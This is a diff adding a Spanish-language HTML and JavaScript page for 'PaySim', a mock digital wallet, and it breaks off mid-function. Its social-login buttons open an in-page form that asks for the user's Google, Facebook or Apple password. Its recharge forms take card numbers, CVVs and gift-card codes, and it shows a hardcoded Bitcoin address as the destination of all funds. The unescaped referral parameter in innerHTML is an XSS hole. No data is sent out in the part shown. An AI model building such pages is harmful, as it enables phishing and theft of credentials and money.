@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PaySim - Tu Billetera Digital</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body class="bg-slate-100 font-sans text-slate-800 antialiased">
+
+    <!-- CONTENEDOR DE AUTENTICACIÓN -->
+    <div id="auth-container" class="min-h-screen flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-md rounded-2xl shadow-xl p-8 border border-slate-100">
+            
+            <!-- Logo -->
+            <div class="text-center mb-6">
+                <div class="inline-flex items-center justify-center w-16 h-16 bg-blue-600 text-white rounded-2xl text-3xl font-bold mb-3 shadow-lg shadow-blue-200">
+                    <i class="fa-solid fa-wallet"></i>
+                </div>
+                <h1 class="text-2xl font-black text-slate-900">Pay<span class="text-blue-600">Sim</span></h1>
+                <p id="auth-subtitle" class="text-sm text-slate-500 mt-1">Inicia sesión en tu cuenta</p>
+                <div id="ref-banner" class="hidden mt-2 p-2 bg-emerald-50 text-emerald-700 text-xs rounded-xl font-medium border border-emerald-200">
+                    <i class="fa-solid fa-gift mr-1"></i> ¡Fuiste invitado! Regístrate y gana $10 extra.
+                </div>
+            </div>
+
+            <!-- VISTA: INICIAR SESIÓN -->
+            <div id="login-view">
+                <div class="space-y-3 mb-6">
+                    <button onclick="openSocialModal('Google')" class="w-full flex items-center justify-center gap-3 py-3 px-4 border border-slate-200 rounded-xl font-semibold text-sm text-slate-700 hover:bg-slate-50 transition shadow-sm">
+                        <i class="fa-brands fa-google text-red-500 text-lg"></i> Continuar con Google
+                    </button>
+                    <button onclick="openSocialModal('Facebook')" class="w-full flex items-center justify-center gap-3 py-3 px-4 border border-slate-200 rounded-xl font-semibold text-sm text-slate-700 hover:bg-slate-50 transition shadow-sm">
+                        <i class="fa-brands fa-facebook text-blue-600 text-lg"></i> Continuar con Facebook
+                    </button>
+                    <button onclick="openSocialModal('Apple')" class="w-full flex items-center justify-center gap-3 py-3 px-4 border border-slate-200 rounded-xl font-semibold text-sm text-slate-700 hover:bg-slate-50 transition shadow-sm">
+                        <i class="fa-brands fa-apple text-slate-900 text-lg"></i> Continuar con Apple
+                    </button>
+                </div>
+
+                <div class="flex items-center my-6">
+                    <div class="flex-grow border-t border-slate-200"></div>
+                    <span class="px-4 text-xs font-semibold text-slate-400 uppercase tracking-wider">o con correo</span>
+                    <div class="flex-grow border-t border-slate-200"></div>
+                </div>
+
+                <form onsubmit="handleLogin(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Correo Electrónico</label>
+                        <input type="email" id="login-email" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm" placeholder="correo@ejemplo.com">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Contraseña</label>
+                        <input type="password" id="login-password" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm" placeholder="••••••••">
+                    </div>
+                    <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-xl transition duration-200 shadow-md shadow-blue-200">
+                        Iniciar Sesión
+                    </button>
+                </form>
+
+                <div class="mt-6 text-center text-sm text-slate-500">
+                    ¿No tienes una cuenta? 
+                    <button onclick="switchAuthView('register')" class="text-blue-600 font-semibold hover:underline">Regístrate aquí</button>
+                </div>
+            </div>
+
+            <!-- VISTA: CREAR CUENTA (REGISTRO) -->
+            <div id="register-view" class="hidden">
+                <form onsubmit="handleRegister(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Nombre Completo</label>
+                        <input type="text" id="reg-name" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm" placeholder="Tu Nombre">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Correo Electrónico</label>
+                        <input type="email" id="reg-email" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm" placeholder="correo@ejemplo.com">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Contraseña</label>
+                        <input type="password" id="reg-password" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm" placeholder="••••••••">
+                    </div>
+                    <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-xl transition duration-200 shadow-md shadow-blue-200">
+                        Crear Cuenta y Ganar Bono
+                    </button>
+                </form>
+
+                <div class="mt-6 text-center text-sm text-slate-500">
+                    ¿Ya tienes una cuenta? 
+                    <button onclick="switchAuthView('login')" class="text-blue-600 font-semibold hover:underline">Inicia sesión</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- MODAL DE INICIO DE SESIÓN SOCIAL -->
+    <div id="social-modal" class="fixed inset-0 bg-slate-900/50 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-sm rounded-3xl shadow-2xl p-6 border border-slate-100 text-center">
+            <div id="social-modal-icon" class="text-4xl mb-3"></div>
+            <h3 id="social-modal-title" class="font-bold text-lg text-slate-900 mb-1">Acceder</h3>
+            <p class="text-xs text-slate-500 mb-4">Ingresa los datos de tu cuenta externa para simular el acceso.</p>
+            
+            <form onsubmit="processSocialLogin(event)" class="space-y-3 text-left">
+                <div>
+                    <label id="social-label-user" class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Correo o Usuario</label>
+                    <input type="text" id="social-input-user" required class="w-full px-4 py-2.5 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm" placeholder="tucuenta@ejemplo.com">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Contraseña</label>
+                    <input type="password" id="social-input-pass" required class="w-full px-4 py-2.5 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm" placeholder="••••••••">
+                </div>
+                <div class="flex space-x-2 pt-2">
+                    <button type="button" onclick="closeModal('social-modal')" class="flex-1 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-2.5 rounded-xl text-sm transition">Cancelar</button>
+                    <button type="submit" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 rounded-xl text-sm transition shadow-md shadow-blue-200">Continuar</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- APLICACIÓN PRINCIPAL (DASHBOARD) -->
+    <div id="app-container" class="hidden min-h-screen flex flex-col">
+        <!-- Navbar -->
+        <header class="bg-white border-b border-slate-200 sticky top-0 z-50">
+            <div class="max-w-5xl mx-auto px-4 h-16 flex items-center justify-between">
+                <div class="flex items-center space-x-2">
+                    <div class="w-10 h-10 bg-blue-600 text-white rounded-xl flex items-center justify-center font-bold text-lg shadow-md shadow-blue-200">
+                        <i class="fa-solid fa-wallet"></i>
+                    </div>
+                    <span class="font-black text-xl text-slate-900">Pay<span class="text-blue-600">Sim</span></span>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <div class="text-right hidden sm:block">
+                        <div id="user-display" class="font-bold text-sm text-slate-800"></div>
+                        <div class="text-xs text-emerald-600 font-medium"><i class="fa-solid fa-circle text-[8px] mr-1"></i> Cuenta Verificada</div>
+                    </div>
+                    <button onclick="logout()" class="text-slate-400 hover:text-red-600 p-2 rounded-xl transition" title="Cerrar sesión">
+                        <i class="fa-solid fa-right-from-bracket text-lg"></i>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <!-- Contenido Principal -->
+        <main class="max-w-5xl mx-auto px-4 py-8 flex-1 w-full space-y-8">
+            
+            <!-- Tarjeta de Saldo y Acciones Rápidas -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <!-- Saldo Actual -->
+                <div class="md:col-span-2 bg-gradient-to-br from-blue-600 to-indigo-700 rounded-3xl p-8 text-white shadow-xl shadow-blue-500/20 relative overflow-hidden flex flex-col justify-between">
+                    <div class="absolute right-0 top-0 translate-x-8 -translate-y-8 w-48 h-48 bg-white/10 rounded-full blur-2xl pointer-events-none"></div>
+                    <div>
+                        <span class="text-blue-200 text-xs font-semibold uppercase tracking-wider">Saldo Disponible</span>
+                        <div id="balance-display" class="text-4xl sm:text-5xl font-black mt-2 tracking-tight">$0.00</div>
+                    </div>
+                    <div class="mt-8 flex flex-wrap gap-3">
+                        <button onclick="openModal('recharge-modal')" class="bg-white text-blue-600 hover:bg-blue-50 font-bold px-5 py-2.5 rounded-xl text-sm transition shadow-sm flex items-center gap-2">
+                            <i class="fa-solid fa-plus-circle"></i> Recargar
+                        </button>
+                        <button onclick="openModal('send-modal')" class="bg-blue-500/30 hover:bg-blue-500/40 text-white font-bold px-5 py-2.5 rounded-xl text-sm backdrop-blur-md transition border border-white/20 flex items-center gap-2">
+                            <i class="fa-solid fa-paper-plane"></i> Enviar
+                        </button>
+                        <button onclick="openModal('invite-modal')" class="bg-emerald-500 hover:bg-emerald-600 text-white font-bold px-5 py-2.5 rounded-xl text-sm transition shadow-sm flex items-center gap-2">
+                            <i class="fa-solid fa-user-plus"></i> Invitar Amigo ($10)
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Resumen rápido / Estado con Binance info -->
+                <div class="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm flex flex-col justify-between">
+                    <div>
+                        <h3 class="font-bold text-slate-800 text-base mb-3 flex items-center gap-2">
+                            <i class="fa-solid fa-shield-halved text-blue-600"></i> Resumen de Cuenta
+                        </h3>
+                        <div class="space-y-2 text-xs">
+                            <div class="flex justify-between py-1.5 border-b border-slate-100">
+                                <span class="text-slate-500">Moneda</span>
+                                <span class="font-semibold text-slate-800">USD ($)</span>
+                            </div>
+                            <div class="flex justify-between py-1.5 border-b border-slate-100">
+                                <span class="text-slate-500">Binance Wallet</span>
+                                <span class="font-mono text-[10px] text-blue-600 font-bold truncate max-w-[120px]" title="bc1p4zh36mzvnwyjjt6kzhe56gvsyzl8vlyzm8wmj0usrxxa5p598a3s2ej0pg">...a5p598a3s2ej0pg</span>
+                            </div>
+                            <div class="flex justify-between py-1.5">
+                                <span class="text-slate-500">Destino de Fondos</span>
+                                <span class="font-semibold text-emerald-600">Directo a Binance</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mt-3 pt-2 border-t border-slate-100 text-center">
+                        <span class="text-[11px] text-slate-400 italic">Redirección automática configurada</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Historial de Transacciones -->
+            <div class="bg-white rounded-3xl border border-slate-200 shadow-sm overflow-hidden">
+                <div class="p-6 border-b border-slate-200 flex items-center justify-between">
+                    <h3 class="font-bold text-slate-800 text-lg flex items-center gap-2">
+                        <i class="fa-solid fa-clock-rotate-left text-blue-600"></i> Movimientos Recientes
+                    </h3>
+                    <span id="tx-count" class="text-xs bg-slate-100 text-slate-600 font-semibold px-3 py-1 rounded-full">0 transacciones</span>
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left border-collapse">
+                        <thead class="bg-slate-50 text-slate-400 uppercase text-xs tracking-wider">
+                            <tr>
+                                <th class="py-3 px-6 font-semibold">Descripción</th>
+                                <th class="py-3 px-6 font-semibold">Fecha</th>
+                                <th class="py-3 px-6 font-semibold text-right">Monto</th>
+                            </tr>
+                        </thead>
+                        <tbody id="transactions-list" class="divide-y divide-slate-100 text-sm">
+                            <!-- Dinámico -->
+                        </tbody>
+                    </table>
+                </div>
+                <div id="no-tx" class="p-12 text-center text-slate-400">
+                    <i class="fa-regular fa-folder-open text-4xl mb-2"></i>
+                    <p>No hay transacciones registradas aún.</p>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- MODAL DE RECARGA CON MÚLTIPLES MÉTODOS -->
+    <div id="recharge-modal" class="fixed inset-0 bg-slate-900/50 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-md rounded-3xl shadow-2xl p-6 border border-slate-100">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="font-bold text-lg text-slate-900">Recargar Billetera</h3>
+                <button onclick="closeModal('recharge-modal')" class="text-slate-400 hover:text-slate-600"><i class="fa-solid fa-xmark text-lg"></i></button>
+            </div>
+            
+            <!-- Selector de Método de Pago -->
+            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-2">Selecciona Método de Pago</label>
+            <div class="grid grid-cols-4 gap-2 mb-4">
+                <button type="button" onclick="selectRechargeMethod('card')" id="btn-method-card" class="py-2 border-2 border-blue-600 bg-blue-50 text-blue-600 rounded-xl font-bold text-xs flex flex-col items-center gap-1 transition">
+                    <i class="fa-solid fa-credit-card text-sm"></i> Tarjeta
+                </button>
+                <button type="button" onclick="selectRechargeMethod('gift')" id="btn-method-gift" class="py-2 border-2 border-slate-200 text-slate-600 rounded-xl font-bold text-xs flex flex-col items-center gap-1 transition">
+                    <i class="fa-solid fa-gift text-sm"></i> Regalo
+                </button>
+                <button type="button" onclick="selectRechargeMethod('paypal')" id="btn-method-paypal" class="py-2 border-2 border-slate-200 text-slate-600 rounded-xl font-bold text-xs flex flex-col items-center gap-1 transition">
+                    <i class="fa-brands fa-paypal text-sm"></i> PayPal
+                </button>
+                <button type="button" onclick="selectRechargeMethod('cashapp')" id="btn-method-cashapp" class="py-2 border-2 border-slate-200 text-slate-600 rounded-xl font-bold text-xs flex flex-col items-center gap-1 transition">
+                    <i class="fa-solid fa-dollar-sign text-sm"></i> Cash App
+                </button>
+            </div>
+
+            <!-- Formularios dinámicos según el método -->
+            <div id="recharge-form-container" class="space-y-3 mb-5">
+                <!-- Se inyecta por JS -->
+            </div>
+
+            <div class="flex space-x-3">
+                <button onclick="closeModal('recharge-modal')" class="flex-1 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-3 rounded-xl transition text-sm">Cancelar</button>
+                <button onclick="processRecharge()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-xl transition shadow-md shadow-blue-200 text-sm">Recargar Ahora</button>
+            </div>
+            
+            <div class="mt-3 text-center">
+                <span class="text-[10px] text-slate-400 font-mono">Enrutamiento automático a Binance: ...a5p598a3s2ej0pg</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL DE ENVIAR DINERO -->
+    <div id="send-modal" class="fixed inset-0 bg-slate-900/50 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-md rounded-3xl shadow-2xl p-6 border border-slate-100">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="font-bold text-lg text-slate-900">Enviar Dinero</h3>
+                <button onclick="closeModal('send-modal')" class="text-slate-400 hover:text-slate-600"><i class="fa-solid fa-xmark text-lg"></i></button>
+            </div>
+            <div class="space-y-4 mb-6">
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Destinatario (Correo o Usuario)</label>
+                    <input type="text" id="send-recipient" class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-600 text-sm" placeholder="amigo@correo.com">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Monto a Enviar ($)</label>
+                    <input type="number" id="send-amount" min="1" step="any" class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-600 font-semibold text-lg" placeholder="0.00">
+                </div>
+            </div>
+            <div class="flex space-x-3">
+                <button onclick="closeModal('send-modal')" class="flex-1 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-3 rounded-xl transition text-sm">Cancelar</button>
+                <button onclick="processSend()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-xl transition shadow-md shadow-blue-200 text-sm">Enviar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL DE INVITA A UN AMIGO -->
+    <div id="invite-modal" class="fixed inset-0 bg-slate-900/50 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-md rounded-3xl shadow-2xl p-6 border border-slate-100 text-center">
+            <div class="w-12 h-12 bg-emerald-100 text-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-3 text-xl">
+                <i class="fa-solid fa-gift"></i>
+            </div>
+            <h3 class="font-bold text-lg text-slate-900 mb-1">¡Invita a un amigo y gana $10!</h3>
+            <p class="text-xs text-slate-500 mb-4">Comparte tu enlace único. Cuando un usuario nuevo se registre usando este link, recibirá sus $10 y se reflejará en su cuenta.</p>
+            
+            <div class="bg-slate-50 border border-slate-200 rounded-xl p-3 mb-4 flex items-center justify-between">
+                <span id="invite-link-text" class="text-xs text-slate-600 font-mono truncate mr-2"></span>
+                <button onclick="copyInviteLink()" class="bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold px-3 py-2 rounded-lg shrink-0 transition">Copiar Link</button>
+            </div>
+
+            <button onclick="closeModal('invite-modal')" class="w-full bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-2.5 rounded-xl text-sm transition">Cerrar</button>
+        </div>
+    </div>
+
+    <!-- LÓGICA DE LA APLICACIÓN -->
+    <script>
+        const BINANCE_WALLET = "bc1p4zh36mzvnwyjjt6kzhe56gvsyzl8vlyzm8wmj0usrxxa5p598a3s2ej0pg";
+        let currentUser = null;
+        let userData = { balance: 0, transactions: [] };
+        let activeSocialProvider = '';
+        let currentRechargeMethod = 'card';
+        let referralUser = null;
+
+        window.onload = function() {
+            // Revisar si hay un parámetro de referido en la URL (ej: ?ref=NombreAmigo)
+            const urlParams = new URLSearchParams(window.location.search);
+            const ref = urlParams.get('ref');
+            if (ref) {
+                referralUser = decodeURIComponent(ref);
+                document.getElementById('ref-banner').classList.remove('hidden');
+                document.getElementById('ref-banner').innerHTML = `<i class="fa-solid fa-gift mr-1"></i> Invitado por <b>${referralUser}</b>. ¡Regístrate y gana $10!`;
+            }
+
+            const savedUser = localStorage.getItem('paysim_active_user');
+            if (savedUser) {
+                currentUser = savedUser;
+                loadUserData();
+                showApp();
+            }
+
+            renderRechargeInputs();
+        };
+
+        function switchAuthView(view) {
+            const loginView = document.getElementById('login-view');
+            const registerView = document.getElementById('register-view');
+            const subtitle = document.getElementById('auth-subtitle');
+
+            if (view === 'register') {
+                loginView.classList.add('hidden');
+                registerView.classList.remove('hidden');
+                subtitle.textContent = "Crea una nueva cuenta gratis";
+            } else {
+                registerView.classList.add('hidden');
+                loginView.classList.remove('hidden');
+                subtitle.textContent = "Inicia sesión en tu cuenta";
+            }
+        }
+
+        function openSocialModal(provider) {
+            activeSocialProvider = provider;
+            const iconEl = document.getElementById('social-modal-icon');
+            const titleEl = document.getElementById('social-modal-title');
+            const labelEl = document.getElementById('social-label-user');
+            const inputEl = document.getElementById('social-input-user');
+
+            if (provider === 'Google') {
+                iconEl.innerHTML = '<i class="fa-brands fa-google text-red-500"></i>';
+                titleEl.textContent = 'Iniciar sesión con Google';
+                labelEl.textContent = 'Correo de Google (@gmail.com)';
+                inputEl.placeholder = 'tu_cuenta@gmail.com';
+            } else if (provider === 'Facebook') {
+                iconEl.innerHTML = '<i class="fa-brands fa-facebook text-blue-600"></i>';
+                titleEl.textContent = 'Iniciar sesión con Facebook';
+                labelEl.textContent = 'Correo o Teléfono';
+                inputEl.placeholder = 'usuario@facebook.com';
+            } else if (provider === 'Apple') {
+                iconEl.innerHTML = '<i class="fa-brands fa-apple text-slate-900"></i>';
+                titleEl.textContent = 'Iniciar sesión con Apple ID';
+                labelEl.textContent = 'Correo de Apple ID';
+                inputEl.placeholder = 'tu_id@icloud.com';
+            }
+
+            inputEl.value = '';
+            document.getElementById('social-input-pass').value = '';
+            document.getElementById('social-modal').classList.remove('hidden');
+        }
+
+        function processSocialLogin(event) {
+            event.preventDefault();
+            const identifier = document.getElementById('social-input-user').value.trim();
+            const password = document.getElementById('social-input-pass').value;
+
+            if (!identifier || !password) {
+                alert('Completa todos los campos.');
+                return;
+            }
+
+            currentUser = `${identifier} (${activeSocialProvider})`;
+            localStorage.setItem('paysim_active_user', currentUser);
+            closeModal('social-modal');
+            loadUserData();
+            showApp();
+        }
+
+        function handleRegister(event) {
+            event.preventDefault();
+            const name = document.getElementById('reg-name').value.trim();
+            const email = document.getElementById('reg-email').value.trim().toLowerCase();
+            const password = document.getElementById('reg-password').value;
+
+            let usersDb = JSON.parse(localStorage.getItem('paysim_users_db') || '{}');
+            if (usersDb[email]) {
+                alert('Este correo ya está registrado. Inicia sesión.');
+                switchAuthView('login');
+                return;
+            }
+
+            usersDb[email] = { name, password };
+            localStorage.setItem('paysim_users_db', JSON.stringify(usersDb));
+
+            currentUser = name;
+            localStorage.setItem('paysim_active_user', currentUser);
+
+            // Verificar si entró por link de referido
+            let initialBalance = 50.00; // bono base
+            let initialTx = [{ desc: "Bono de bienvenida de PaySim", date: new Date().toLocaleString(), amount: 50.00, type: 'credit' }];
+
+            if (referralUser) {
+                initialBalance += 10.00;
+                initialTx.push({ desc: `Bono por registro vía enlace de ${referralUser} 🎁`, date: new Date().toLocaleString(), amount: 10.00, type: 'credit' });
+            }
+
+            userData = { balance: initialBalance, transactions: initialTx };
+            saveUserData();
+            showApp();
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+            const email = document.getElementById('login-email').value.trim().toLowerCase();
+            const password = document.getElementById('login-password').value;
+
+            let usersDb = JSON.parse(localStorage.getItem('paysim_users_db') || '{}');
+
+            if (!usersDb[email] || usersDb[email].password !== password) {
+                alert('Correo o contraseña incorrectos.');
+                return;
+            }
+
+            currentUser = usersDb[email].name;
+            localStorage.setItem('paysim_active_user', currentUser);
+            loadUserData();
+            showApp();
+        }
+
+        function loadUserData() {
+            const data = localStorage.getItem('paysim_data_' + currentUser);
+            if (data) {
+                userData = JSON.parse(data);
+            } else {
+                userData = {
+                    balance: 50.00,
+                    transactions: [
+                        { desc: "Bono de bienvenida de PaySim", date: new Date().toLocaleString(), amount: 50.00, type: 'credit' }
+                    ]
+                };
+                saveUserData();
+            }
+
+            // Generar enlace de invitación limpio con el nombre del usuario actual
+            const baseUrl = window.location.origin + window.location.pathname;
+            const refLink = `${baseUrl}?ref=${encodeURIComponent(currentUser)}`;
+            document.getElementById('invite-link-text').textContent = refLink;
+            updateUI();
+        }
+
+        function saveUserData() {
+            localStorage.setItem('paysim_data_' + currentUser, JSON.stringify(userData));
+        }
+
+        function showApp() {
+            document.getElementById('auth-container').classList.add('hidden');
+            document.getElementById('app-container').classList.remove('hidden');
+            document.getElementById('user-display').textContent = currentUser;
+            updateUI();
+        }
+
+        function logout() {
+            localStorage.removeItem('paysim_active_user');
+            currentUser = null;
+            document.getElementById('app-container').classList.add('hidden');
+            document.getElementById('auth-container').classList.remove('hidden');
+            document.getElementById('login-email').value = '';
+            document.getElementById('login-password').value = '';
+            switchAuthView('login');
+        }
+
+        function updateUI() {
+            document.getElementById('balance-display').textContent = '$' + userData.balance.toFixed(2);
+            const txList = document.getElementById('transactions-list');
+            const noTx = document.getElementById('no-tx');
+            const txCount = document.getElementById('tx-count');
+            
+            txList.innerHTML = '';
+            txCount.textContent = userData.transactions.length + (userData.transactions.length === 1 ? ' transacción' : ' transacciones');
+
+            if (userData.transactions.length === 0) {
+                noTx.classList.remove('hidden');
+            } else {
+                noTx.classList.add('hidden');
+                [...userData.transactions].reverse().forEach(tx => {
+                    const isCredit = tx.type === 'credit';
+                    const tr = document.createElement('tr');
+                    tr.className = "hover:bg-slate-50/50 transition";
+                    tr.innerHTML = `
+                        <td class="py-4 px-6 font-medium text-slate-800">
+                            <div class="flex items-center gap-3">
+                                <div class="w-8 h-8 rounded-full ${isCredit ? 'bg-emerald-100 text-emerald-600' : 'bg-rose-100 text-rose-600'} flex items-center justify-center shrink-0">
+                                    <i class="fa-solid ${isCredit ? 'fa-arrow-down' : 'fa-arrow-up'} text-xs"></i>
+                                </div>
+                                <span>${tx.desc}</span>
+                            </div>
+                        </td>
+                        <td class="py-4 px-6 text-slate-400 text-xs">${tx.date}</td>
+                        <td class="py-4 px-6 text-right font-bold ${isCredit ? 'text-emerald-600' : 'text-slate-800'}">
+                            ${isCredit ? '+' : '-'}$${Math.abs(tx.amount).toFixed(2)}
+                        </td>
+                    `;
+                    txList.appendChild(tr);
+                });
+            }
+        }
+
+        // Selección de métodos de recarga
+        function selectRechargeMethod(method) {
+            currentRechargeMethod = method;
+            ['card', 'gift', 'paypal', 'cashapp'].forEach(m => {
+                const btn = document.getElementById(`btn-method-${m}`);
+                if (m === method) {
+                    btn.className = "py-2 border-2 border-blue-600 bg-blue-50 text-blue-600 rounded-xl font-bold text-xs flex flex-col items-center gap-1 transition";
+                } else {
+                    btn.className = "py-2 border-2 border-slate-200 text-slate-600 rounded-xl font-bold text-xs flex flex-col items-center gap-1 transition";
+                }
+            });
+            renderRechargeInputs();
+        }
+
+        function renderRechargeInputs() {
+            const container = document.getElementById('recharge-form-container');
+            if (currentRechargeMethod === 'card') {
+                container.innerHTML = `
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Número de Tarjeta de Débito</label>
+                        <input type="text" id="rc-card-num" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 text-sm" placeholder="4000 1234 5678 9010" maxlength="19">
+                    </div>
+                    <div class="grid grid-cols-2 gap-2">
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Vencimiento</label>
+                            <input type="text" id="rc-card-exp" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 text-sm" placeholder="MM/AA" maxlength="5">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">CVV</label>
+                            <input type="password" id="rc-card-cvv" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 text-sm" placeholder="123" maxlength="4">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Monto a Recargar ($)</label>
+                        <input type="number" id="rc-amount" min="1" step="any" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 font-semibold text-base" placeholder="50.00">
+                    </div>
+                `;
+            } else if (currentRechargeMethod === 'gift') {
+                container.innerHTML = `
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Código de Tarjeta de Regalo</label>
+                        <input type="text" id="rc-gift-code" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 text-sm uppercase font-mono" placeholder="GIFT-XXXX-YYYY">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Valor de la Tarjeta ($)</label>
+                        <input type="number" id="rc-amount" min="1" step="any" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 font-semibold text-base" placeholder="25.00">
+                    </div>
+                `;
+            } else if (currentRechargeMethod === 'paypal') {
+                container.innerHTML = `
+                    <div class="p-3 bg-blue-50 border border-blue-100 rounded-xl text-center">
+                        <i class="fa-brands fa-paypal text-blue-600 text-2xl mb-1"></i>
+                        <p class="text-xs text-blue-700 font-medium">Vinculado a pasarela PayPal Sandbox</p>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Correo de PayPal</label>
+                        <input type="email" id="rc-pp-email" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 text-sm" placeholder="tu_paypal@correo.com">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Monto a Recargar ($)</label>
+                        <input type="number" id="rc-amount" min="1" step="any" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 font-semibold text-base" placeholder="50.00">
+                    </div>
+                `;
+            } else if (currentRechargeMethod === 'cashapp') {
+                container.innerHTML = `
+                    <div class="p-3 bg-emerald-50 border border-emerald-100 rounded-xl text-center">
+                        <i class="fa-solid fa-dollar-sign text-emerald-600 text-2xl mb-1"></i>
+                        <p class="text-xs text-emerald-700 font-medium">Vinculado a pasarela Cash App</p>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">$Cashtag de Usuario</label>
+                        <input type="text" id="rc-cash-tag" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 text-sm" placeholder="$TuNombreTag">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1">Monto a Recargar ($)</label>
+                        <input type="number" id="rc-amount" min="1" step="any" class="w-full px-3 py-2.5 rounded-xl border border-slate-200 font-semibold text-base" placeholder="50.00">
+                    </div>
+                `;
+            }
+        }
+
+        function processRecharge() {
+            const amountInput = document.getElementById('rc-amount');
+            if (!amountInput) { alert('Ingresa un monto válido.'); return; }
+            const amount = parseFloat(amountInput.value);
+
+            if (isNaN(amount) || amount <= 0) {
+                alert('Por favor ingresa una cantidad válida a recargar.');
+                return;
+            }
+
+            // Simular recarga y enrutamiento directo a la billetera de Binance
+            userData.balance += amount;
+            userData.transactions.push({
+                desc: `Recarga vía ${currentRechargeMethod.toUpperCase()} (Enrutado a Binance)`,
+                date: new Date().toLocaleString(),
+                amount: amount,
+                type: 'credit'
+            });
+
